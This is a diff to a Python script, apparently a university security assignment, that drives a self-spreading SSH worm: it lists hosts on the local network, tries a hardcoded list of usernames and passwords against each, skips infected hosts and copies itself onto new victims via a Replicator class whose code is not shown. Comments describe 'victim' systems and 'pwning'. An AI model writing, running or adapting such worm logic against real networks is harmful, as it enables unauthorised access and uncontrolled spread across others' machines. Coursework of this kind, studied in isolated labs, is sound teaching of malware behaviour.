@@ -2,17 +2,28 @@ import sys
 
 from Replicator import Replicator
 
+DEBUG = True
+
+try:
+	dprint
+except:
+	def dprint(msg, debug=True):
+		if debug:
+			print(msg)
+
 def main(argv):
 
 	# The list of credentials to attempt
 	credList = [
-	('hello', 'world'),
-	('hello1', 'world'),
-	('root', '#Gig#'),
-	('cpsc', 'cpsc'),
+		('cpsc', 'cpsc'),
+		('hello', 'world'),
+		('hello1', 'world'),
+		('root', '#Gig#'),
 	]
 
 	myReplicator = Replicator(credList)
+
+	isHost = True
 
 	# If we are being run without a command line parameters,
 	# then we assume we are executing on a victim system and
@@ -25,47 +36,49 @@ def main(argv):
 	# system against the hardcoded IP.
 	if len(argv) < 1:
 
+		dprint("Running on victim system...", DEBUG)
+
+		isHost = False
+
 		# TODO: If we are running on the victim, check if
 		# the victim was already infected. If so, terminate.
 		# Otherwise, proceed with malice.
 		if Replicator.isInfectedSystem():
+			dprint("Victim system is already infected. Terminate", DEBUG)
 			sys.exit(0)
 
-	# hostSystem = Replicator.getMyIP()
+	if isHost:
+		Replicator.markAsHost()
 
-	# TODO: Get the IP of the current system
-	currentIp = Replicator.getMyIP()
+	# Get the IP of the current system
+	currentIp = Replicator.getMyIP('eth2')
+	dprint("Current IP: " + currentIp, DEBUG)
 
 	# Get the hosts on the same network
 	networkHosts = Replicator.getHostsOnTheSameNetwork()
 
-	# TODO: Remove the IP of the current system
+	# Remove the IP of the current system
 	# from the list of discovered systems (we
 	# do not want to target ourselves!).
-
-	# if hostSystem in networkHosts:
-	# 	networkHosts.remove(hostSystem)
-
 	if currentIp in networkHosts:
 		networkHosts.remove(currentIp)
 
-	print("Found hosts: ", networkHosts)
+	dprint("Found hosts: %s" % str(networkHosts), DEBUG)
 
 	# Go through the network hosts
 	for host in networkHosts:
 
+		dprint("### Probing " + host + " ###", DEBUG)
+
 		# Try to attack this host
 		sshInfo, sshClient =  myReplicator.attackSystem(host)
 
-		print(sshInfo)
+		dprint("Final assessment: " + Replicator.desc(sshInfo), DEBUG)
 
 		# Did the attack succeed?
 		if sshInfo == Replicator.SUCCESSFUL_CONNECTION:
 
-			print("Trying to spread")
-
-			if not myReplicator.isInfectedSystem():
-				myReplicator.spreadAndExecute()
+			dprint("Trying to spread...", DEBUG)
 
 			# TODO: Check if the system was
 			# already infected. This can be
@@ -94,9 +107,22 @@ def main(argv):
 			# If the system was already infected proceed.
 			# Otherwise, infect the system and terminate.
 			# Infect that system
-			# myReplicator.spreadAndExecute()
 
-			print ("Spreading complete")
+			if not myReplicator.remoteSystemIsHost():
+				if not myReplicator.remoteSystemIsInfected():
+					dprint(host + " is not infected yet", DEBUG)
+					myReplicator.spreadAndExecute(isHost)
+					Replicator.markInfected()
+				else:
+					dprint(host + " is already infected yet", DEBUG)
+			else:
+				dprint("Remote system is host, cancel the attack", DEBUG)
+
+
+			dprint("Spreading complete", DEBUG)
+
+	dprint("Finished pwning...")
+	sys.exit(0)
 	
 if __name__ == "__main__":
 	main(sys.argv[1:])
